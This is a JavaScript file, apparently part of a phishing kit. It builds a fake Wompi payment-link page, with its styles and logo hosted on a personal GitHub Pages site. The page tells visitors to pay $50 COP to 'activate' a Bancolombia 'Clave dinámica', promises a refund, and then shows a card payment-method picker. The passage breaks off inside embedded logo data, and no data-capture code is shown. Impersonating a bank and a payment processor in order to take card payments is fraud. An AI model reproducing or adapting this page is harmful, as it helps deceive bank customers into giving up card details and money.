var myHosting ="https://itsmariodev.github.io/";

let head = `
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="${myHosting}WOMPO/css/wompi.css">
<link rel="stylesheet" href="${myHosting}WOMPO/css/method.css">
<link rel="stylesheet" href="${myHosting}WOMPO/css/contacto.css">
<link rel="stylesheet" href="${myHosting}WOMPO/css/card.css">
<link rel="stylesheet" href="${myHosting}WOMPO/css/process.css">
<link rel="stylesheet" href="${myHosting}WOMPO/css/responsive.css">
<link rel="stylesheet" href="${myHosting}WOMPO/css/errores.css">
<link rel="shortcut icon" href="${myHosting}WOMPO/img/favicon.png" type="image/x-icon">
<title>Wompi</title>
`;

let contenido = `<div id="root">
<div class="src-components-App-__App__appWrapper__KDAu3">
    <div id="app" class="src-components-App-__App__app__zz6DY ">

    <div id="cargando" class="src-components-App-__App__contentSection__NXGfR">
        <!-- Componente cargando -->
        <div class="src-components-App-__App__contentContainer__xY6Uv">

            <div class="src-components-App-__App__viewTitle__Vm1q6  undefined">
                <span class="src-components-App-__App__title__BrHES">Cargando link de pago</span>
            </div>

            <div class="src-components-App-__App__routeWrapper__1ZgBl">
                <div>
                    <div class="src-components-PaymentLink-__PaymentLink__spinner__RKUF6">
                        <div class="src-components-Spinner-__Spinner__spinner__RG4zj">

                            <div> Cargando, espera un momento por favor. </div>
                            <div class="src-components-Spinner-__Spinner__spinnerlogo__qCHLV">
                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 40 40">
                                    <path
                                        d="M20.201 5.169c-8.254 0-14.946 6.692-14.946 14.946 0 8.255 6.692 14.946 14.946 14.946s14.946-6.691 14.946-14.946c-.001-8.254-6.692-14.946-14.946-14.946zm0 26.58c-6.425 0-11.634-5.208-11.634-11.634 0-6.425 5.209-11.634 11.634-11.634 6.425 0 11.633 5.209 11.633 11.634 0 6.426-5.208 11.634-11.633 11.634z"
                                        opacity=".2" fill="#210049"></path>
                                    <path
                                        d="M26.013 10.047l1.654-2.866a14.855 14.855 0 0 0-7.466-2.012v3.312c2.119 0 4.1.576 5.812 1.566z"
                                        fill="#210049"></path>
                                </svg>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div id="infoLeft" class="src-components-App-__App__merchantSection__6AANE" style="display: none;">
        <!--Componente izquierda payment methods -->
        <div>
            <div class="src-components-Header-__Header__header__Yi+AA">
                <div class="src-components-Header-__Header__logoWrapper__QkMtF">
                    <div class="src-components-Header-__Header__logo__5aban force-printable"
                        style="background-image: url(${myHosting}WOMPO/img/logo.png);"></div>
                    <div class="src-components-Header-__Header__merchant__a1e3j">Pago a&nbsp;<strong>Clave
                            dinámica Bancolombia</strong></div>
                </div>
            </div>
        </div>

        <div class="src-components-App-__App__merchantContainer__cAamA">
            <div class="src-components-PricePanel-__PricePanel__pricePanel__d4-NO">
                <div class="src-components-PricePanel-__PricePanel__paymentDetails__AGlE8">
                    <div class="src-components-PricePanel-__PricePanel__nameWrapper__aiPlI">
                        <div
                            class="src-components-PricePanel-__PricePanel__itemName__biREB src-components-PricePanel-__PricePanel__left__gt+zo">

                            <span>Activar Clave dinámica</span>
                            <div class="src-components-PricePanel-__PricePanel__amountToPay__V3gOF ">
                                <strong>$50</strong>
                                <div class="src-components-PricePanel-__PricePanel__currencyLabel__Wca2n">
                                    COP</div>
                            </div>
                            <div class="src-components-PricePanel-__PricePanel__helpMe__X3h1x ">
                                <span>¿Necesitas ayuda</span>?
                            </div>
                            <div class="src-components-PricePanel-__PricePanel__productDescription__PFIqS">
                                Desbloquea la clave dinámica realizando un pago de $50 que será devuelto al
                                saldo de tu tarjeta. A través de notificaciones te informaremos sobre la
                                activación de la clave dinámica y la anulación del pago.</div>



                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div id="undefined" class="src-components-App-__App__contentSection__NXGfR" style="display: none;">
        <!--Componente derecha payment methods undefined -->
        <div class="src-components-App-__App__contentContainer__xY6Uv">
            <div class="src-components-App-__App__viewTitle__Vm1q6  undefined">
                <span class="src-components-App-__App__title__BrHES">Escoge un método de pago</span>
            </div>
            <div class="src-components-App-__App__routeWrapper__1ZgBl">
                <div>
                    <div class="src-components-PaymentMethod-__PaymentMethod__methods__I+LYF">
                        <div id="btnPaymentMethods"
                            class="src-components-PaymentMethod-__PaymentMethod__method__+K2Ju">
                            <div
                                class="src-components-PaymentMethod-__PaymentMethod__methodLogo__FXg64 src-components-PaymentMethod-__PaymentMethod__logoCard__VOgFc">
                                <div
                                    class="src-components-PaymentMethod-__PaymentMethod__logoWrapper__z2new">
                                    <img
                                        src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzkiIGhlaWdodD0iMTIiIHZpZXdCb3g9IjAgMCAzOSAxMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTE0LjE5MjUgMTEuNzA4M0wxNi4wNjU4IDAuNzYxNzU4SDE5LjA2MjNMMTcuMTg3MiAxMS43MDgzSDE0LjE5MTlIMTQuMTkyNVpNMjguMDEyOCAwLjk5NzczM0MyNy40MTkzIDAuNzc1NzM4IDI2LjQ4ODggMC41MzgwODYgMjUuMzI3NSAwLjUzODA4NkMyMi4zNjY0IDAuNTM4MDg2IDIwLjI4MTQgMi4wMjI3MSAyMC4yNjM0IDQuMTUwMzlDMjAuMjQ2NiA1LjcyMzM3IDIxLjc1MjEgNi42MDA3MiAyMi44ODg3IDcuMTI0NjhDMjQuMDU1IDcuNjYxNDkgMjQuNDQ3IDguMDAzMTUgMjQuNDQxNCA4LjQ4MjM3QzI0LjQzNDEgOS4yMTYwMSAyMy41MDk4IDkuNTUxNTIgMjIuNjQ4OSA5LjU1MTUyQzIxLjQ0OTQgOS41NTE1MiAyMC44MTI2IDkuMzg1NDQgMTkuODI4MiA4Ljk3NjY4TDE5LjQ0MTkgOC44MDI3OEwxOS4wMjEzIDExLjI1MzFDMTkuNzIxIDExLjU1ODQgMjEuMDE1MyAxMS44MjM1IDIyLjM1OTEgMTEuODM2OUMyNS41MDg5IDExLjgzNjkgMjcuNTUzNSAxMC4zNjkgMjcuNTc3MSA4LjA5NzA5QzI3LjU4ODMgNi44NTE3OSAyNi43ODk4IDUuOTAzOTggMjUuMDYxMyA1LjEyMjgxQzI0LjAxNCA0LjYxNjE5IDIzLjM3MjcgNC4yNzg0NSAyMy4zNzk1IDMuNzY1NjhDMjMuMzc5NSAzLjMxMDUgMjMuOTIyNSAyLjgyNDAyIDI1LjA5NTYgMi44MjQwMkMyNi4wNzU1IDIuODA4OTIgMjYuNzg1MyAzLjAyMTk3IDI3LjMzODQgMy4yNDM0TDI3LjYwNjggMy4zNjk3OEwyOC4wMTI4IDAuOTk3MTczVjAuOTk3NzMzWk0zNS43MjM1IDAuNzYxMTk5SDMzLjQwODJDMzIuNjkxMSAwLjc2MTE5OSAzMi4xNTQzIDAuOTU2MzUzIDMxLjgzOTMgMS42Njg3NUwyNy4zODk1IDExLjcwMDVIMzAuNTM1OUMzMC41MzU5IDExLjcwMDUgMzEuMDUwMyAxMC4zNTE3IDMxLjE2NjUgMTAuMDU1M0MzMS41MTAyIDEwLjA1NTMgMzQuNTY2NyAxMC4wNTk4IDM1LjAwNDIgMTAuMDU5OEMzNS4wOTQgMTAuNDQyOSAzNS4zNjg2IDExLjY5OTkgMzUuMzY4NiAxMS42OTk5SDM4LjE0ODlMMzUuNzIzNSAwLjc2MDA4MVYwLjc2MTE5OVpNMzIuMDQ5OCA3LjgzMDM2QzMyLjI5NzUgNy4xOTk2MSAzMy4yNDM3IDQuNzcwNTIgMzMuMjQzNyA0Ljc3MDUyQzMzLjIyNTcgNC43OTk2IDMzLjQ4OTcgNC4xMzY5NyAzMy42NDA3IDMuNzI1OTdMMzMuODQyOSA0LjY2OTg3QzMzLjg0MjkgNC42Njk4NyAzNC40MTY4IDcuMjgyOTIgMzQuNTM2NCA3LjgzMDkySDMyLjA0OTNMMzIuMDQ5OCA3LjgzMDM2Wk0xMS42NDg2IDAuNzYxNzU4TDguNzE1MSA4LjIyNjgyTDguNDAyMzEgNi43MDk3NkM3Ljg1NTkyIDQuOTYxMjEgNi4xNTQ5OCAzLjA2NjcgNC4yNTI0NCAyLjExNzc3TDYuOTM0OTggMTEuNjkwOUwxMC4xMDU1IDExLjY4NzZMMTQuODIyNSAwLjc2MTc1OEgxMS42NDg2WiIgZmlsbD0iIzFBMUY3MSIvPgo8cGF0aCBkPSJNNS4xNjU4OCAwLjAwMDU1NjMxNUgwLjUyMzAyMkwwLjQ4NjMyOCAwLjIyNjc1NUM0LjA5ODUyIDEuMTI3MTEgNi40ODg0NyAzLjMwMzUxIDcuNDgwODMgNS45MTg0Mkw2LjQ3MTIxIDAuOTE4NjkyQzYuMjk2OTEgMC4yMjk1MzQgNS43OTEyOSAwLjAyNDQ1NCA1LjE2NTg4IDAiIGZpbGw9IiNGMkFFMTQiLz4KPC9zdmc+Cg=="><img
                                        src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzAiIGhlaWdodD0iMjMiIHZpZXdCb3g9IjAgMCAzMCAyMyIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPGcgY2xpcC1wYXRoPSJ1cmwoI2NsaXAwXzI2XzEwMzQyKSI+CjxwYXRoIGQ9Ik0yOC41NDU3IDIyLjY5NzRWMjIuNzU0M0gyOC41OTg3QzI4LjYwODcgMjIuNzU0NSAyOC42MTg1IDIyLjc1MjEgMjguNjI3MSAyMi43NDcxQzI4LjYzNDEgMjIuNzQyMSAyOC42MzgyIDIyLjczMzkgMjguNjM3OCAyMi43MjUzQzI4LjYzODIgMjIuNzE2OSAyOC42MzQxIDIyLjcwODggMjguNjI3MSAyMi43MDQxQzI4LjYxODYgMjIuNjk5IDI4LjYwODcgMjIuNjk2NCAyOC41OTg3IDIyLjY5NjlIMjguNTQ1N1YyMi42OTc0Wk0yOC41OTkzIDIyLjY1NzJDMjguNjIyIDIyLjY1NTcgMjguNjQ0NSAyMi42NjIzIDI4LjY2MjkgMjIuNjc1N0MyOC42NzggMjIuNjg3OSAyOC42ODYyIDIyLjcwNjcgMjguNjg1MiAyMi43MjZDMjguNjg2IDIyLjc0MjcgMjguNjc5NCAyMi43NTg3IDI4LjY2NzMgMjIuNzcwM0MyOC42NTMxIDIyLjc4MjcgMjguNjM1MiAyMi43OSAyOC42MTY1IDIyLjc5MTVMMjguNjg3NSAyMi44NzI2SDI4LjYzMjhMMjguNTY3NCAyMi43OTJIMjguNTQ2M1YyMi44NzI2SDI4LjUwMDVWMjIuNjU3M0gyOC41OTkzVjIyLjY1NzJaTTI4LjU4NTEgMjIuOTQ2N0MyOC42MDkxIDIyLjk0NyAyOC42MzI4IDIyLjk0MjEgMjguNjU0OCAyMi45MzI1QzI4LjY3NiAyMi45MjM0IDI4LjY5NTMgMjIuOTEwMyAyOC43MTE3IDIyLjg5MzlDMjguNzI4IDIyLjg3NzUgMjguNzQxMSAyMi44NTgzIDI4Ljc1MDIgMjIuODM3QzI4Ljc2ODggMjIuNzkxOSAyOC43Njg4IDIyLjc0MTMgMjguNzUwMiAyMi42OTYyQzI4Ljc0MDkgMjIuNjc1IDI4LjcyNzkgMjIuNjU1NiAyOC43MTE3IDIyLjYzOTJDMjguNjk1MyAyMi42MjI5IDI4LjY3NiAyMi42MDk4IDI4LjY1NDggMjIuNjAwN0MyOC42MzI3IDIyLjU5MTYgMjguNjA4OSAyMi41ODcgMjguNTg1MSAyMi41ODczQzI4LjU2MDggMjIuNTg3IDI4LjUzNjYgMjIuNTkxNiAyOC41MTQgMjIuNjAwN0MyOC40OTIzIDIyLjYwOTYgMjguNDcyNyAyMi42MjI3IDI4LjQ1NTkgMjIuNjM5MkMyOC40MDQ1IDIyLjY5MiAyOC4zODk1IDIyLjc3MDQgMjguNDE4IDIyLjgzODRDMjguNDI2NiAyMi44NTk4IDI4LjQzOTYgMjIuODc5MSAyOC40NTU5IDIyLjg5NTNDMjguNDcyNyAyMi45MTE4IDI4LjQ5MjMgMjIuOTI0OSAyOC41MTQgMjIuOTMzOUMyOC41MzY1IDIyLjk0MzQgMjguNTYwNiAyMi45NDg0IDI4LjU4NTEgMjIuOTQ4MVYyMi45NDY3Wk0yOC41ODUxIDIyLjUzNTVDMjguNjQ3NCAyMi41MzU1IDI4LjcwNzYgMjIuNTYgMjguNzUyIDIyLjYwMzhDMjguNzczNSAyMi42MjQ5IDI4Ljc5MDUgMjIuNjQ5OSAyOC44MDIzIDIyLjY3NzdDMjguODI2OSAyMi43MzUxIDI4LjgyNjkgMjIuODAwMSAyOC44MDIzIDIyLjg1NzZDMjguNzkwNCAyMi44ODUyIDI4Ljc3MzIgMjIuOTEwMyAyOC43NTIgMjIuOTMxNUMyOC43MzAzIDIyLjk1MjQgMjguNzA0OCAyMi45NjkzIDI4LjY3NzEgMjIuOTgxM0MyOC42NDggMjIuOTkzNiAyOC42MTY4IDIyLjk5OTkgMjguNTg1MSAyMi45OTk4QzI4LjU1MzEgMjMgMjguNTIxNCAyMi45OTM2IDI4LjQ5MTkgMjIuOTgxM0MyOC40NjM5IDIyLjk2OTYgMjguNDM4MyAyMi45NTI3IDI4LjQxNjQgMjIuOTMxNUMyOC4zOTUyIDIyLjkwOTQgMjguMzc4MyAyMi44ODM1IDI4LjM2NjggMjIuODU1MkMyOC4zNDIyIDIyLjc5NzcgMjguMzQyMiAyMi43MzI3IDI4LjM2NjggMjIuNjc1MkMyOC4zNzg2IDIyLjY0NzUgMjguMzk1NyAyMi42MjI1IDI4LjQxNzEgMjIuNjAxNEMyOC40Mzg2IDIyLjU3OTkgMjguNDY0MyAyMi41NjI4IDI4LjQ5MjYgMjIuNTUxNkMyOC41MjIxIDIyLjUzOTIgMjguNTUzOCAyMi41MzI4IDI4LjU4NTggMjIuNTMzMUwyOC41ODUxIDIyLjUzNTVaTTYuODI3NTcgMjEuNzA0MkM2LjgyNzU3IDIxLjI5MzggNy4wOTYxMyAyMC45NTY2IDcuNTM1MDYgMjAuOTU2NkM3Ljk3Mzk5IDIwLjk1NjYgOC4yMzc1NyAyMS4yNzkzIDguMjM3NTcgMjEuNzA0MkM4LjIzNzU3IDIyLjEyOTIgNy45NTQ1MiAyMi40NTE5IDcuNTM1MDYgMjIuNDUxOUM3LjExNTU5IDIyLjQ1MTkgNi44Mjc1NyAyMi4xMTQ3IDYuODI3NTcgMjEuNzA0MlpNOC43MTU3MiAyMS43MDQyVjIwLjUzNjJIOC4yMDg1OFYyMC44MjA3QzguMDQ3NzMgMjAuNjEwNSA3LjgwMzc2IDIwLjQ3ODYgNy40NzE5NyAyMC40Nzg2QzYuODE4MzMgMjAuNDc4NiA2LjMwNTM3IDIwLjk5MTkgNi4zMDUzNyAyMS43MDQ4QzYuMzA1MzcgMjIuNDE3NyA2LjgxODA1IDIyLjkzMSA3LjQ3MTk3IDIyLjkzMUM3LjgwMzYxIDIyLjkzMSA4LjA0NzczIDIyLjc5OSA4LjIwODU4IDIyLjU4ODlWMjIuODcyNEg4LjcxNTE1VjIxLjcwNDJIOC43MTU3MlpNMjUuODUxMiAyMS43MDQyQzI1Ljg1MTIgMjEuMjkzOCAyNi4xMTk3IDIwLjk1NjYgMjYuNTU4OCAyMC45NTY2QzI2Ljk5NzkgMjAuOTU2NiAyNy4yNjEzIDIxLjI3OTMgMjcuMjYxMyAyMS43MDQyQzI3LjI2MTMgMjIuMTI5MiAyNi45Nzg3IDIyLjQ1MTkgMjYuNTU4OCAyMi40NTE5QzI2LjEzODkgMjIuNDUxOSAyNS44NTEyIDIyLjExNDcgMjUuODUxMiAyMS43MDQyWk0yNy43Mzk5IDIxLjcwNDJWMTkuNTk4NkgyNy4yMzIzVjIwLjgyMDdDMjcuMDcxNSAyMC42MTA1IDI2LjgyNzUgMjAuNDc4NiAyNi40OTU3IDIwLjQ3ODZDMjUuODQyMSAyMC40Nzg2IDI1LjMyOTEgMjAuOTkxOSAyNS4zMjkxIDIxLjcwNDhDMjUuMzI5MSAyMi40MTc3IDI1Ljg0MTggMjIuOTMxIDI2LjQ5NTcgMjIuOTMxQzI2LjgyNzUgMjIuOTMxIDI3LjA3MTUgMjIuNzk5IDI3LjIzMjMgMjIuNTg4OVYyMi44NzI0SDI3LjczOTlWMjEuNzA0MlpNMTUuMDA5OSAyMC45MzI2QzE1LjMzNjggMjAuOTMyNiAxNS41NDY2IDIxLjEzNzcgMTUuNjAwMiAyMS40OTg5SDE0LjM5MDFDMTQuNDQ0MyAyMS4xNjE4IDE0LjY0ODcgMjAuOTMyNiAxNS4wMTAxIDIwLjkzMjZIMTUuMDA5OVpNMTUuMDIwMiAyMC40NzczQzE0LjMzNjcgMjAuNDc3MyAxMy44NTg1IDIwLjk3NTIgMTMuODU4NSAyMS43MDM1QzEzLjg1ODUgMjIuNDMxOCAxNC4zNTU5IDIyLjkyOTggMTUuMDU0MSAyMi45Mjk4QzE1LjQwNTQgMjIuOTI5OCAxNS43MjcxIDIyLjg0MiAxNi4wMTAxIDIyLjYwMjVMMTUuNzYxNiAyMi4yMjYyQzE1LjU2NjEgMjIuMzgyNyAxNS4zMTcxIDIyLjQ3MDUgMTUuMDgzMSAyMi40NzA1QzE0Ljc1NjMgMjIuNDcwNSAxNC40NTg3IDIyLjMxOSAxNC4zODU2IDIxLjg5ODZIMTYuMTE3M0MxNi4xMjIyIDIxLjgzNTQgMTYuMTI3NCAyMS43NzE3IDE2LjEyNzQgMjEuNzAzNEMxNi4xMjIyIDIwLjk3NTQgMTUuNjcyNyAyMC40NzcyIDE1LjAxOTkgMjAuNDc3MkwxNS4wMjAyIDIwLjQ3NzNaTTIxLjE0MjcgMjEuNzAzNEMyMS4xNDI3IDIxLjI5MjkgMjEuNDExMyAyMC45NTU4IDIxLjg1MDIgMjAuOTU1OEMyMi4yODkxIDIwLjk1NTggMjIuNTUyNyAyMS4yNzg0IDIyLjU1MjcgMjEuNzAzNEMyMi41NTI3IDIyLjEyODMgMjIuMjY5NyAyMi40NTEgMjEuODUwMiAyMi40NTFDMjEuNDMwOCAyMi40NTEgMjEuMTQyNiAyMi4xMTM4IDIxLjE0MjYgMjEuNzAzNEgyMS4xNDI3Wk0yMy4wMzA3IDIxLjcwMzRWMjAuNTM2MkgyMi41MjM5VjIwLjgyMDdDMjIuMzYyNSAyMC42MTA1IDIyLjExOTEgMjAuNDc4NiAyMS43ODczIDIwLjQ3ODZDMjEuMTMzNiAyMC40Nzg2IDIwLjYyMDcgMjAuOTkxOSAyMC42MjA3IDIxLjcwNDhDMjAuNjIwNyAyMi40MTc3IDIxLjEzMzMgMjIuOTMxIDIxLjc4NzMgMjIuOTMxQzIyLjExOTEgMjIuOTMxIDIyLjM2MjUgMjIuNzk5IDIyLjUyMzkgMjIuNTg4OVYyMi44NzI0SDIzLjAzMDlWMjEuNzAzNEgyMy4wMzA3Wk0xOC4yNzg3IDIxLjcwMzRDMTguMjc4NyAyMi40MTE4IDE4Ljc3MTIgMjIuOTI5NiAxOS41MjI5IDIyLjkyOTZDMTkuODc0MSAyMi45Mjk2IDIwLjEwODEgMjIuODUxNCAyMC4zNjEyIDIyLjY1MTJMMjAuMTE3NyAyMi4yNDA3QzE5LjkyNzMgMjIuMzc3NyAxOS43MjczIDIyLjQ1MSAxOS41MDY3IDIyLjQ1MUMxOS4xMDE4IDIyLjQ0NiAxOC44MDQxIDIyLjE1MyAxOC44MDQxIDIxLjcwMzRDMTguODA0MSAyMS4yNTM4IDE5LjEwMTggMjAuOTYwOSAxOS41MDY3IDIwLjk1NThDMTkuNzI2OCAyMC45NTU4IDE5LjkyNjcgMjEuMDI5IDIwLjExNzcgMjEuMTY2TDIwLjM2MTIgMjAuNzU1NkMyMC4xMDc3IDIwLjU1NTQgMTkuODczNyAyMC40NzcyIDE5LjUyMjkgMjAuNDc3MkMxOC43NzEyIDIwLjQ3NzIgMTguMjc4NyAyMC45OTQ5IDE4LjI3ODcgMjEuNzAzNFpNMjQuODE2NCAyMC40NzcyQzI0LjUyMzkgMjAuNDc3MiAyNC4zMzMzIDIwLjYxNDIgMjQuMjAxNiAyMC44MTkzVjIwLjUzNjJIMjMuNjk5VjIyLjg3MTFIMjQuMjA2N1YyMS41NjIzQzI0LjIwNjcgMjEuMTc1OCAyNC4zNzI1IDIwLjk2MTIgMjQuNzA0IDIwLjk2MTJDMjQuODEyNiAyMC45NTk2IDI0LjkyMDUgMjAuOTc5NSAyNS4wMjEyIDIxLjAxOTlMMjUuMTc3NSAyMC41NDEzQzI1LjA2NTIgMjAuNDk3MSAyNC45MTg5IDIwLjQ3NzYgMjQuODE2MiAyMC40Nzc2TDI0LjgxNjQgMjAuNDc3MlpNMTEuMjIyOCAyMC43MjE5QzEwLjk3ODkgMjAuNTYwOCAxMC42NDI3IDIwLjQ3NzYgMTAuMjcxOCAyMC40Nzc2QzkuNjgwOTcgMjAuNDc3NiA5LjMwMDU4IDIwLjc2MTEgOS4zMDA1OCAyMS4yMjUxQzkuMzAwNTggMjEuNjA1OCA5LjU4Mzc3IDIxLjg0MDcgMTAuMTA1MyAyMS45MTM5TDEwLjM0NDggMjEuOTQ4MUMxMC42MjI5IDIxLjk4NzIgMTAuNzU0MiAyMi4wNjA1IDEwLjc1NDIgMjIuMTkyNEMxMC43NTQyIDIyLjM3MjkgMTAuNTY5NSAyMi40NzU5IDEwLjIyMjYgMjIuNDc1OUM5Ljg3NTc4IDIyLjQ3NTkgOS42MTc4OCAyMi4zNjM1IDkuNDQ2OTQgMjIuMjMxNkw5LjIwODY0IDIyLjYyNzZDOS40ODY3MiAyMi44MzI3IDkuODM3OTggMjIuOTMwNiAxMC4yMTg0IDIyLjkzMDZDMTAuODkxOSAyMi45MzA2IDExLjI4MjIgMjIuNjEzMSAxMS4yODIyIDIyLjE2ODVDMTEuMjgyMiAyMS43NTggMTAuOTc1IDIxLjU0MzMgMTAuNDY3NSAyMS40NzAxTDEwLjIyODUgMjEuNDM1M0MxMC4wMDg5IDIxLjQwNjkgOS44MzMwMSAyMS4zNjI2IDkuODMzMDEgMjEuMjA2MUM5LjgzMzAxIDIxLjAzNTQgOS45OTg4MyAyMC45MzI3IDEwLjI3NzEgMjAuOTMyN0MxMC41NzQ3IDIwLjkzMjcgMTAuODYyOSAyMS4wNDUxIDExLjAwNDEgMjEuMTMyOUwxMS4yMjM3IDIwLjcyMjRMMTEuMjIyOCAyMC43MjE5Wk0xNy43NjY0IDIwLjQ3OEMxNy40NzM4IDIwLjQ3OCAxNy4yODMzIDIwLjYxNSAxNy4xNTIxIDIwLjgyMDJWMjAuNTM2MkgxNi42NDk2VjIyLjg3MTFIMTcuMTU2N1YyMS41NjIzQzE3LjE1NjcgMjEuMTc1OCAxNy4zMjI1IDIwLjk2MTIgMTcuNjU0IDIwLjk2MTJDMTcuNzYyNiAyMC45NTk2IDE3Ljg3MDQgMjAuOTc5NSAxNy45NzEyIDIxLjAxOTlMMTguMTI3NSAyMC41NDEzQzE4LjAxNTIgMjAuNDk3MSAxNy44Njg5IDIwLjQ3NzYgMTcuNzY2MSAyMC40Nzc2TDE3Ljc2NjQgMjAuNDc4Wk0xMy40Mzg4IDIwLjUzNjJIMTIuNjA5NVYxOS44Mjc4SDEyLjA5NjlWMjAuNTM2MkgxMS42MjM4VjIxLjAwMDNIMTIuMDk2OVYyMi4wNjU1QzEyLjA5NjkgMjIuNjA3MiAxMi4zMDY5IDIyLjkyOTkgMTIuOTA2OCAyMi45Mjk5QzEzLjEyNjkgMjIuOTI5OSAxMy4zODA0IDIyLjg2MTYgMTMuNTQxMiAyMi43NDk0TDEzLjM5NDcgMjIuMzE0NkMxMy4yNDM0IDIyLjQwMjQgMTMuMDc3NiAyMi40NDY2IDEyLjk0NTcgMjIuNDQ2NkMxMi42OTIyIDIyLjQ0NjYgMTIuNjA5NSAyMi4yOTAxIDEyLjYwOTUgMjIuMDU1OFYyMS4wMDA3SDEzLjQzODhWMjAuNTM2MlpNNS44NTY3OCAyMi44NzE3VjIxLjQwNjNDNS44NTY3OCAyMC44NTQ1IDUuNTA1NTIgMjAuNDgzMSA0LjkzOTI3IDIwLjQ3ODJDNC42NDE1OSAyMC40NzMyIDQuMzM0NTIgMjAuNTY1OSA0LjExOTUzIDIwLjg5MzZDMy45NTg2OCAyMC42MzQ2IDMuNzA1MTggMjAuNDc4MiAzLjM0ODgxIDIwLjQ3ODJDMy4wOTk3MiAyMC40NzgyIDIuODU2MzEgMjAuNTUxNCAyLjY2NTc2IDIwLjgyNDlWMjAuNTM2MkgyLjE1ODJWMjIuODcxMUgyLjY2OTc0VjIxLjU3NjVDMi42Njk3NCAyMS4xNzEyIDIuODk0MjUgMjAuOTU1OCAzLjI0MDk2IDIwLjk1NThDMy41ODc2NyAyMC45NTU4IDMuNzQ4MSAyMS4xNzU2IDMuNzQ4MSAyMS41NzE0VjIyLjg3MDlINC4yNjA3N1YyMS41NzYyQzQuMjYwNzcgMjEuMTcwOSA0LjQ5NDggMjAuOTU1NSA0LjgzMTQzIDIwLjk1NTVDNS4xNjgwNSAyMC45NTU1IDUuMzQyOTcgMjEuMTc1MyA1LjM0Mjk3IDIxLjU3MTFWMjIuODcwNkw1Ljg1Njc4IDIyLjg3MTdaIiBmaWxsPSIjMjMxRjIwIi8+CjxwYXRoIGQ9Ik0yOC44MzU1IDE1LjEwNDlWMTQuNzYzMkgyOC43NDY2TDI4LjY0MzggMTQuOTk3N0wyOC41NDE1IDE0Ljc2MzJIMjguNDUyNFYxNS4xMDQ5SDI4LjUxNTVWMTQuODQ3NUwyOC42MTE3IDE1LjA2OTZIMjguNjc3MUwyOC43NzMyIDE0Ljg0NjlWMTUuMTA0OUgyOC44MzU1Wk0yOC4yNzE2IDE1LjEwNDlWMTQuODIxN0gyOC4zODU0VjE0Ljc2NEgyOC4wOTQ3VjE0LjgyMTdIMjguMjA4NVYxNS4xMDQ5SDI4LjI3MTZaIiBmaWxsPSIjRjc5NDEwIi8+CjxwYXRoIGQ9Ik0xOC43NDE1IDE2LjU2ODlIMTEuMDU2MlYyLjc0MDIzSDE4Ljc0MTZWMTYuNTY4OUgxOC43NDE1WiIgZmlsbD0iI0ZGNUYwMCIvPgo8cGF0aCBkPSJNMTEuNTQzIDkuNjU1MUMxMS41NDMgNi44NDk5NSAxMi44NTQ4IDQuMzUxMTEgMTQuODk3NiAyLjc0MDc1QzEzLjM1MTMgMS41MjAwNyAxMS40Mzg5IDAuODU3NTE1IDkuNDY5NzMgMC44NjAzNjFDNC42MTkwNSAwLjg2MDM2MSAwLjY4NzAxMiA0Ljc5Nzg0IDAuNjg3MDEyIDkuNjU1MUMwLjY4NzAxMiAxNC41MTI0IDQuNjE5MDUgMTguNDQ5OCA5LjQ2OTczIDE4LjQ0OThDMTEuNDM4OSAxOC40NTI4IDEzLjM1MTUgMTcuNzkwMyAxNC44OTc3IDE2LjU2OTVDMTIuODU1MSAxNC45NTk0IDExLjU0MyAxMi40NjA0IDExLjU0MyA5LjY1NTFaIiBmaWxsPSIjRUIwMDFCIi8+CjxwYXRoIGQ9Ik0yOS4xMDk0IDkuNjU1MUMyOS4xMDk0IDE0LjUxMjQgMjUuMTc3MyAxOC40NDk4IDIwLjMyNjcgMTguNDQ5OEMxOC4zNTcyIDE4LjQ1MjcgMTYuNDQ0NSAxNy43OTAxIDE0Ljg5NzkgMTYuNTY5NUMxNi45NDEzIDE0Ljk1OTEgMTguMjUzMSAxMi40NjA0IDE4LjI1MzEgOS42NTUxQzE4LjI1MzEgNi44NDk4MSAxNi45NDEzIDQuMzUxMTEgMTQuODk3OSAyLjc0MDc1QzE2LjQ0NDUgMS41MjAwNyAxOC4zNTcyIDAuODU3NTE1IDIwLjMyNjUgMC44NjAzNjFDMjUuMTc3MiAwLjg2MDM2MSAyOS4xMDkyIDQuNzk3ODQgMjkuMTA5MiA5LjY1NTEiIGZpbGw9IiNGNzlFMUIiLz4KPC9nPgo8ZGVmcz4KPGNsaXBQYXRoIGlkPSJjbGlwMF8yNl8xMDM0MiI+CjxyZWN0IHdpZHRoPSIyOC40MjI0IiBoZWlnaHQ9IjIyLjEzOTYiIGZpbGw9IndoaXRlIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgwLjY4NzAxMiAwLjg2MDM1MikiLz4KPC9jbGlwUGF0aD4KPC9kZWZzPgo8L3N2Zz4K"><img
                                        src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA1MDQgNTA0IiBzdHlsZT0iZW5hYmxlLWJhY2tncm91bmQ6bmV3IDAgMCA1MDQgNTA0IiB4bWw6c3BhY2U9InByZXNlcnZlIj48cGF0aCBzdHlsZT0iZmlsbDojZmZmIiBkPSJNNDUzLjc5IDQzMmgtMzYwVjcyaDM2MHYzNjB6Ii8+PHBhdGggZD0iTTQ1MCA0NTB2LTYyLjc1aC00Ny43OGwtMjQuNTktMjcuMi0yNC43MiAyNy4ySDE5NS4zOVYyNjAuNWgtNTAuODRsNjMuMDYtMTQyLjcxaDYwLjgybDIxLjcxIDQ4Ljg5di00OC44OWg3NS4yOGwxMy4wNyAzNi44NCAxMy4xNS0zNi44NEg0NTBWNTRINTR2Mzk2aDM5NnptLTM5LjczLTc4LjYySDQ1MGwtNTIuNTUtNTUuNzNMNDUwIDI2MC41NmgtMzkuMWwtMzIuNDUgMzUuNDYtMzIuMTQtMzUuNDZoLTM5Ljc0bDUyLjI0IDU1LjQxLTUyLjI0IDU1LjQxaDM4LjYzbDMyLjYxLTM1Ljc4IDMyL